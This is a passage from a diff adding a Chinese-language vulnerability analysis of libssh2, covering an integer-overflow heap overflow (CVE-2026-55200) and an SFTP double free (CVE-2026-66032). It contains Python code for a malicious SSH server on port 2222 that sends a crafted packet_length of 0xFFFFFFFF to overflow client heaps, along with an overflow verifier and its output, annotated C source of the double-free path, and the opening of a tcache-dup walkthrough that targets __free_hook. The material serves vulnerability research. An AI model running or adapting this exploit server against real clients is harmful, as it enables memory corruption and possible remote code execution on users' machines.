+<span class="w">        </span><span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">        模拟密钥交换过程</span>
+<span class="sd">        在真实利用中，需要完成完整的ECDH密钥交换</span>
+<span class="sd">        以建立加密通道，然后在加密层发送恶意包</span>
+<span class="sd">        &quot;&quot;&quot;</span>
+        <span class="c1"># 简化: 发送NEWKEYS消息</span>
+        <span class="n">newkeys_payload</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;B&quot;</span><span class="p">,</span> <span class="n">SSH_MSG_NEWKEYS</span><span class="p">)</span>
+        <span class="n">padding_length</span> <span class="o">=</span> <span class="mi">7</span>  <span class="c1"># 填充到块大小</span>
+        <span class="n">padding</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="n">padding_length</span>
+        <span class="n">packet_length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">newkeys_payload</span><span class="p">)</span> <span class="o">+</span> <span class="n">padding_length</span> <span class="o">+</span> <span class="mi">1</span>
+
+        <span class="n">packet</span> <span class="o">=</span> <span class="p">(</span>
+            <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&gt;I&quot;</span><span class="p">,</span> <span class="n">packet_length</span><span class="p">)</span> <span class="o">+</span>
+            <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;B&quot;</span><span class="p">,</span> <span class="n">padding_length</span><span class="p">)</span> <span class="o">+</span>
+            <span class="n">newkeys_payload</span> <span class="o">+</span>
+            <span class="n">padding</span>
+        <span class="p">)</span>
+
+        <span class="n">client_sock</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[*] NEWKEYS消息已发送&quot;</span><span class="p">)</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">send_malicious_packet</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">client_sock</span><span class="p">:</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">):</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">        发送恶意数据包 - 触发CVE-2026-55200</span>
+
+<span class="sd">        packet_length = 0xFFFFFFFF</span>
+<span class="sd">        在ssh2_transport_read()中:</span>
+<span class="sd">          total_num = 4 + 0xFFFFFFFF + mac_len + auth_len</span>
+<span class="sd">                    = 19 (32位整数回绕)</span>
+<span class="sd">          malloc(19) -&gt; 19字节缓冲区</span>
+<span class="sd">          后续按0xFFFFFFFF语义写入 -&gt; 堆溢出</span>
+<span class="sd">        &quot;&quot;&quot;</span>
+        <span class="c1"># 构造恶意包: packet_length = 0xFFFFFFFF</span>
+        <span class="n">malicious_length</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&gt;I&quot;</span><span class="p">,</span> <span class="n">MALICIOUS_PACKET_LENGTH</span><span class="p">)</span>
+
+        <span class="c1"># padding_length (1字节)</span>
+        <span class="n">padding_length</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;B&quot;</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
+
+        <span class="c1"># 构造溢出数据 (将被写入过小的缓冲区)</span>
+        <span class="c1"># 在真实利用中，这里需要精心构造以覆盖特定的堆结构</span>
+        <span class="c1"># 例如: 覆盖glibc chunk header + 函数指针</span>
+        <span class="n">overflow_data</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x41</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mi">256</span>  <span class="c1"># 填充数据</span>
+
+        <span class="c1"># 拼接恶意包</span>
+        <span class="n">malicious_packet</span> <span class="o">=</span> <span class="n">malicious_length</span> <span class="o">+</span> <span class="n">padding_length</span> <span class="o">+</span> <span class="n">overflow_data</span>
+
+        <span class="n">client_sock</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">malicious_packet</span><span class="p">)</span>
+
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="si">{</span><span class="s1">&#39;=&#39;</span><span class="o">*</span><span class="mi">60</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[!] 恶意数据包已发送!&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="s1">&#39;=&#39;</span><span class="o">*</span><span class="mi">60</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;  packet_length = 0x</span><span class="si">{</span><span class="n">MALICIOUS_PACKET_LENGTH</span><span class="si">:</span><span class="s2">08X</span><span class="si">}</span><span class="s2"> (</span><span class="si">{</span><span class="n">MALICIOUS_PACKET_LENGTH</span><span class="si">}</span><span class="s2">)&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;  预期回绕结果: total_num ≈ 19 字节&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;  分配: malloc(19)&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;  写入: recv(buf, 0xFFFFFFFF) -&gt; 堆溢出&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="s1">&#39;=&#39;</span><span class="o">*</span><span class="mi">60</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">_pack_string</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">data</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;SSH字符串编码: 4字节长度 + 数据&quot;&quot;&quot;</span>
+        <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&gt;I&quot;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">))</span> <span class="o">+</span> <span class="n">data</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">stop</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;停止服务器&quot;&quot;&quot;</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">running</span> <span class="o">=</span> <span class="kc">False</span>
+        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">server_socket</span><span class="p">:</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">server_socket</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+
+<span class="c1"># ============================================================</span>
+<span class="c1"># 整数溢出验证器 (独立运行，不需要网络)</span>
+<span class="c1"># ============================================================</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">verify_integer_overflow</span><span class="p">():</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">    验证CVE-2026-55200的整数溢出算术</span>
+<span class="sd">    模拟ssh2_transport_read()中的total_num计算</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="s2">&quot;=&quot;</span><span class="o">*</span><span class="mi">60</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;CVE-2026-55200 整数溢出验证&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;=&quot;</span><span class="o">*</span><span class="mi">60</span><span class="p">)</span>
+
+    <span class="c1"># 模拟32位无符号整数运算 (Python中需要手动取模)</span>
+    <span class="n">UINT32_MAX</span> <span class="o">=</span> <span class="mh">0xFFFFFFFF</span>
+    <span class="n">MOD</span> <span class="o">=</span> <span class="n">UINT32_MAX</span> <span class="o">+</span> <span class="mi">1</span>  <span class="c1"># 2^32</span>
+
+    <span class="c1"># 攻击者发送的packet_length</span>
+    <span class="n">packet_length</span> <span class="o">=</span> <span class="mh">0xFFFFFFFF</span>
+
+    <span class="c1"># 模拟libssh2的计算 (32位无符号算术)</span>
+    <span class="c1"># 注意: 在C语言中，uint32_t加法自动回绕</span>
+    <span class="c1"># 在Python中需要手动取模</span>
+
+    <span class="n">mac_len</span> <span class="o">=</span> <span class="mi">0</span>       <span class="c1"># 加密建立前无MAC</span>
+    <span class="n">auth_len</span> <span class="o">=</span> <span class="mi">16</span>     <span class="c1"># AEAD认证数据</span>
+
+    <span class="n">total_num</span> <span class="o">=</span> <span class="mi">4</span>                              <span class="c1"># packet_length字段自身</span>
+    <span class="n">total_num</span> <span class="o">=</span> <span class="p">(</span><span class="n">total_num</span> <span class="o">+</span> <span class="n">packet_length</span><span class="p">)</span> <span class="o">%</span> <span class="n">MOD</span>  <span class="c1"># 4 + 0xFFFFFFFF</span>
+    <span class="n">total_num</span> <span class="o">=</span> <span class="p">(</span><span class="n">total_num</span> <span class="o">+</span> <span class="n">mac_len</span><span class="p">)</span> <span class="o">%</span> <span class="n">MOD</span>        <span class="c1"># + mac_len</span>
+    <span class="n">total_num</span> <span class="o">=</span> <span class="p">(</span><span class="n">total_num</span> <span class="o">+</span> <span class="n">auth_len</span><span class="p">)</span> <span class="o">%</span> <span class="n">MOD</span>       <span class="c1"># + auth_len</span>
+
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;  packet_length = 0x</span><span class="si">{</span><span class="n">packet_length</span><span class="si">:</span><span class="s2">08X</span><span class="si">}</span><span class="s2"> (</span><span class="si">{</span><span class="n">packet_length</span><span class="si">}</span><span class="s2">)&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;  mac_len       = </span><span class="si">{</span><span class="n">mac_len</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;  auth_len      = </span><span class="si">{</span><span class="n">auth_len</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;  ────────────────────────────────────&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;  total_num = (4 + 0xFFFFFFFF + 0 + 16) mod 2^32&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;           = (0x100000013) mod 2^32&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;           = 0x</span><span class="si">{</span><span class="n">total_num</span><span class="si">:</span><span class="s2">08X</span><span class="si">}</span><span class="s2"> (</span><span class="si">{</span><span class="n">total_num</span><span class="si">}</span><span class="s2">)&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;  ────────────────────────────────────&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;  malloc(</span><span class="si">{</span><span class="n">total_num</span><span class="si">}</span><span class="s2">)  &lt;- 只分配</span><span class="si">{</span><span class="n">total_num</span><span class="si">}</span><span class="s2">字节!&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;  recv(buf, </span><span class="si">{</span><span class="n">packet_length</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="si">}</span><span class="s2">)  &lt;- 按原始长度写入约4GB!&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;  =&gt; 堆溢出 (Heap Buffer Overflow)&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;  =&gt; CWE-680: Integer Overflow to Buffer Overflow&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;=&quot;</span><span class="o">*</span><span class="mi">60</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
+
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="ow">and</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;verify&quot;</span><span class="p">:</span>
+        <span class="c1"># 仅验证整数溢出算术</span>
+        <span class="n">verify_integer_overflow</span><span class="p">()</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="c1"># 启动恶意SSH服务器</span>
+        <span class="n">server</span> <span class="o">=</span> <span class="n">MaliciousSSHServer</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s2">&quot;0.0.0.0&quot;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">2222</span><span class="p">)</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">server</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+        <span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
+            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">[*] 服务器停止&quot;</span><span class="p">)</span>
+            <span class="n">server</span><span class="o">.</span><span class="n">stop</span><span class="p">()</span>
+</code></pre></div>
+
+<p>运行验证器输出：</p>
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>python3<span class="w"> </span>malicious_ssh_server.py<span class="w"> </span><span class="nv">verify</span>
+
+<span class="o">============================================================</span>
+CVE-2026-55200<span class="w"> </span><span class="nv">整数溢出验证</span>
+<span class="o">============================================================</span>
+<span class="w">  </span><span class="nv">packet_length</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0xFFFFFFFF<span class="w"> </span><span class="o">(</span><span class="m">4294967295</span><span class="o">)</span>
+<span class="w">  </span><span class="nv">mac_len</span><span class="w">       </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>
+<span class="w">  </span><span class="nv">auth_len</span><span class="w">      </span><span class="o">=</span><span class="w"> </span><span class="m">16</span>
+<span class="w">  </span>────────────────────────────────────
+<span class="w">  </span><span class="nv">total_num</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span><span class="m">4</span><span class="w"> </span>+<span class="w"> </span>0xFFFFFFFF<span class="w"> </span>+<span class="w"> </span><span class="m">0</span><span class="w"> </span>+<span class="w"> </span><span class="m">16</span><span class="o">)</span><span class="w"> </span>mod<span class="w"> </span><span class="m">2</span>^32
+<span class="w">           </span><span class="o">=</span><span class="w"> </span><span class="o">(</span>0x100000013<span class="o">)</span><span class="w"> </span>mod<span class="w"> </span><span class="m">2</span>^32
+<span class="w">           </span><span class="o">=</span><span class="w"> </span>0x00000013<span class="w"> </span><span class="o">(</span><span class="m">19</span><span class="o">)</span>
+<span class="w">  </span>────────────────────────────────────
+<span class="w">  </span>malloc<span class="o">(</span><span class="m">19</span><span class="o">)</span><span class="w">  </span>&lt;-<span class="w"> </span>只分配19字节!
+<span class="w">  </span>recv<span class="o">(</span>buf,<span class="w"> </span><span class="m">4294967294</span><span class="o">)</span><span class="w">  </span>&lt;-<span class="w"> </span>按原始长度写入约4GB!
+<span class="w">  </span><span class="o">=</span>&gt;<span class="w"> </span>堆溢出<span class="w"> </span><span class="o">(</span>Heap<span class="w"> </span>Buffer<span class="w"> </span>Overflow<span class="o">)</span>
+<span class="w">  </span><span class="o">=</span>&gt;<span class="w"> </span>CWE-680:<span class="w"> </span>Integer<span class="w"> </span>Overflow<span class="w"> </span>to<span class="w"> </span>Buffer<span class="w"> </span><span class="nv">Overflow</span>
+<span class="o">============================================================</span>
+</code></pre></div>
+
+<hr />
+<h2>4. CVE-2026-66032：SFTP双重释放漏洞</h2>
+<h3>4.1 漏洞概况</h3>
+<table>
+<thead>
+<tr>
+<th>项目</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CVE编号</td>
+<td>CVE-2026-66032</td>
+</tr>
+<tr>
+<td>CVSS 3.1评分</td>
+<td>8.8 (High)</td>
+</tr>
+<tr>
+<td>CWE分类</td>
+<td>CWE-415 (Double Free)</td>
+</tr>
+<tr>
+<td>影响版本</td>
+<td>libssh2 至1.11.1</td>
+</tr>
+<tr>
+<td>漏洞函数</td>
+<td><code>sftp_open()</code> in <code>src/sftp.c</code></td>
+</tr>
+<tr>
+<td>攻击条件</td>
+<td>已认证客户端打开SFTP会话</td>
+</tr>
+<tr>
+<td>修复commit</td>
+<td><code>5e4776146552d898b9c0e1b313cd093fa8dc92d0</code></td>
+</tr>
+<tr>
+<td>披露日期</td>
+<td>2026年7月24日 (VulnCheck)</td>
+</tr>
+</tbody>
+</table>
+<h3>4.2 根因分析：sftp_open()中的双重释放</h3>
+<p>CVE-2026-66032发生在SFTP协议层，需要客户端已通过SSH认证并打开SFTP会话。漏洞的触发条件是恶意SSH服务器对<code>SSH_FXP_OPEN</code>请求返回一个特殊的响应序列。</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// src/sftp.c - sftp_open() 函数中的双重释放 (简化分析)</span>
+
+<span class="n">LIBSSH2_SFTP_HANDLE</span><span class="w"> </span><span class="o">*</span><span class="nf">sftp_open</span><span class="p">(</span><span class="n">LIBSSH2_SFTP</span><span class="w"> </span><span class="o">*</span><span class="n">sftp</span><span class="p">,</span><span class="w"> </span>
+<span class="w">                                </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">filename</span><span class="p">,</span><span class="w"> </span>
+<span class="w">                                </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">flags</span><span class="p">,</span><span class="w"> </span>
+<span class="w">                                </span><span class="kt">long</span><span class="w"> </span><span class="n">mode</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="c1">// ... 构造SSH_FXP_OPEN请求并发送 ...</span>
+
+<span class="w">    </span><span class="c1">// 等待服务器响应</span>
+<span class="w">    </span><span class="c1">// 服务器响应SSH_FXP_STATUS包含FX_OK表示成功</span>
+<span class="w">    </span><span class="c1">// 但随后sftp_packet_require()可能返回错误</span>
+
+<span class="w">    </span><span class="c1">// 漏洞代码路径:</span>
+
+<span class="w">    </span><span class="c1">// 步骤1: 读取SSH_FXP_OPEN的响应</span>
+<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">data</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">size_t</span><span class="w"> </span><span class="n">data_len</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">rc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sftp_packet_require</span><span class="p">(</span><span class="n">sftp</span><span class="p">,</span><span class="w"> </span><span class="n">SSH_FXP_STATUS</span><span class="p">,</span><span class="w"> </span>
+<span class="w">                                  </span><span class="o">&amp;</span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">data_len</span><span class="p">);</span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">rc</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="c1">// 服务器返回了SSH_FXP_STATUS</span>
+<span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">status</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ssh2_ntohu32</span><span class="p">(</span><span class="n">data</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">5</span><span class="p">);</span><span class="w">  </span><span class="c1">// 解析状态码</span>
+
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">status</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">LIBSSH2_FX_OK</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="c1">// 服务器表示打开成功</span>
+<span class="w">            </span><span class="c1">// 漏洞: 在这里释放了data缓冲区</span>
+<span class="w">            </span><span class="n">LIBSSH2_FREE</span><span class="p">(</span><span class="n">session</span><span class="p">,</span><span class="w"> </span><span class="n">data</span><span class="p">);</span><span class="w">  </span><span class="c1">// 第一次释放!</span>
+<span class="w">            </span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
+
+<span class="w">            </span><span class="c1">// 但继续等待后续数据包...</span>
+<span class="w">            </span><span class="c1">// 如果后续的sftp_packet_require()返回特定错误</span>
+<span class="w">            </span><span class="c1">// (如LIBSSH2_ERROR_CHANNEL_PACKET_EXCEEDED)</span>
+
+<span class="w">            </span><span class="n">rc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sftp_packet_require</span><span class="p">(</span><span class="n">sftp</span><span class="p">,</span><span class="w"> </span><span class="n">SSH_FXP_HANDLE</span><span class="p">,</span>
+<span class="w">                                      </span><span class="o">&amp;</span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">data_len</span><span class="p">);</span>
+
+<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">rc</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="c1">// 错误处理路径</span>
+<span class="w">                </span><span class="c1">// 漏洞: data指针可能仍指向已释放的内存</span>
+<span class="w">                </span><span class="c1">// (在某些代码路径中，data未被置NULL或检查)</span>
+
+<span class="w">                </span><span class="c1">// 如果代码执行到这里时data仍然指向之前释放的地址</span>
+<span class="w">                </span><span class="c1">// 并且存在清理代码再次释放它:</span>
+<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                    </span><span class="n">LIBSSH2_FREE</span><span class="p">(</span><span class="n">session</span><span class="p">,</span><span class="w"> </span><span class="n">data</span><span class="p">);</span><span class="w">  </span><span class="c1">// 第二次释放! DOUBLE FREE!</span>
+<span class="w">                </span><span class="p">}</span>
+
+<span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
+<span class="w">            </span><span class="p">}</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="c1">// ... 正常处理 ...</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>双重释放的触发条件总结：</p>
+<div class="highlight"><pre><span></span><code>┌─────────────────────────────────────────────────────────────────┐
+│              CVE-2026-66032 双重释放触发条件                      │
+├─────────────────────────────────────────────────────────────────┤
+│                                                                 │
+│  1. 客户端已认证并打开SFTP会话                                   │
+│                                                                 │
+│  2. 客户端发送 SSH_FXP_OPEN 请求                                 │
+│                                                                 │
+│  3. 恶意服务器响应 SSH_FXP_STATUS + FX_OK                        │
+│     → libssh2 第一次释放 data 缓冲区 (FREE #1)                   │
+│                                                                 │
+│  4. libssh2 继续等待 SSH_FXP_HANDLE 响应                         │
+│                                                                 │
+│  5. 恶意服务器返回错误或畸形响应                                  │
+│     → sftp_packet_require() 返回 LIBSSH2_ERROR_CHANNEL_PACKET_EXCEEDED
+│                                                                 │
+│  6. 错误处理路径中，data 指针被再次释放 (FREE #2)                 │
+│     → DOUBLE FREE!                                              │
+│                                                                 │
+│  7. 在glibc上，double free可导致:                                │
+│     - tcache dup: 重复的tcache条目                               │
+│     - 重叠分配: 两个指针指向同一块内存                            │
+│     - 函数指针覆写: 劫持控制流                                    │
+│     - 最终RCE                                                    │
+│                                                                 │
+└─────────────────────────────────────────────────────────────────┘
+</code></pre></div>
+
+<h3>4.3 tcache dup利用原理</h3>
+<p>在glibc 2.26+中，tcache（Thread Local Caching）机制为双重释放提供了理想的利用原语：</p>
+<div class="highlight"><pre><span></span><code><span class="err">┌──────────────────────────────────────────────────────────────────┐</span>
+<span class="err">│</span><span class="w">              </span><span class="n">tcache</span><span class="w"> </span><span class="n">dup</span><span class="w"> </span><span class="n">利用流程</span><span class="w"> </span><span class="p">(</span><span class="n">glibc</span><span class="w"> </span><span class="mf">2.26</span><span class="o">+</span><span class="p">)</span><span class="w">                    </span><span class="err">│</span>
+<span class="err">├──────────────────────────────────────────────────────────────────┤</span>
+<span class="err">│</span><span class="w">                                                                  </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="nl">正常状态</span><span class="p">:</span><span class="w">                                                       </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="n">tcache</span><span class="o">[</span><span class="n">0x20</span><span class="o">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="k">NULL</span><span class="w">  </span><span class="p">(</span><span class="n">空链表</span><span class="p">)</span><span class="w">                                  </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                                                                  </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="nl">步骤1</span><span class="p">:</span><span class="w"> </span><span class="n">第一次</span><span class="w"> </span><span class="k">FREE</span><span class="w"> </span><span class="p">(</span><span class="n">data缓冲区</span><span class="p">)</span><span class="w">                                 </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="n">tcache</span><span class="o">[</span><span class="n">0x20</span><span class="o">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="o">[</span><span class="n">chunk_A</span><span class="o">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="k">NULL</span><span class="w">                               </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                  </span><span class="p">(</span><span class="n">data被放入tcache</span><span class="p">)</span><span class="w">                               </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                                                                  </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="nl">步骤2</span><span class="p">:</span><span class="w"> </span><span class="n">第二次</span><span class="w"> </span><span class="k">FREE</span><span class="w"> </span><span class="p">(</span><span class="n">同一指针</span><span class="err">!</span><span class="w"> </span><span class="k">DOUBLE</span><span class="w"> </span><span class="k">FREE</span><span class="p">)</span><span class="w">                      </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="n">tcache</span><span class="o">[</span><span class="n">0x20</span><span class="o">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="o">[</span><span class="n">chunk_A</span><span class="o">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="o">[</span><span class="n">chunk_A</span><span class="o">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="p">...</span><span class="w"> </span><span class="p">(</span><span class="n">循环链表</span><span class="err">!</span><span class="p">)</span><span class="w">       </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                   </span><span class="o">^</span><span class="w">              </span><span class="o">^</span><span class="w">                                </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                   </span><span class="err">└──</span><span class="w"> </span><span class="n">同一地址</span><span class="w"> </span><span class="err">──┘</span><span class="w">                                </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                                                                  </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="nl">步骤3</span><span class="p">:</span><span class="w"> </span><span class="n">第一次</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="k">size</span><span class="p">)</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">返回</span><span class="w"> </span><span class="n">chunk_A</span><span class="w">                      </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="nl">攻击者写入</span><span class="p">:</span><span class="w"> </span><span class="n">chunk_A</span><span class="p">.</span><span class="n">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">__free_hook</span><span class="w"> </span><span class="p">(</span><span class="n">或target_address</span><span class="p">)</span><span class="w">        </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="n">tcache</span><span class="o">[</span><span class="n">0x20</span><span class="o">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="o">[</span><span class="n">chunk_A</span><span class="o">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="o">[</span><span class="n">&amp;__free_hook</span><span class="o">]</span><span class="w">                     </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                                                                  </span><span class="err">│</span>
